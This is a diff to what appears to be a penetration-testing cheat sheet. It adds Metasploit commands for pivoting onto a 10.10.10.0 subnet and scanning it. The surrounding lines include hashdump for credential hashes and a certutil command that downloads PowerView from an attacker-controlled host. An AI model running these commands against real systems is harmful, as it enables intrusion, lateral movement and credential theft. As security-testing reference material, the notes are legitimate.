@@ -386,6 +386,9 @@ hashdump
 background
 sessions
 sessions -i 1
+ipconfig
+run post/multi/manage/autoroute SUBNET=10.10.10.0 ACTION=add
+run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
 
 [*] Powerview
 powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programdata\powerview.ps1"
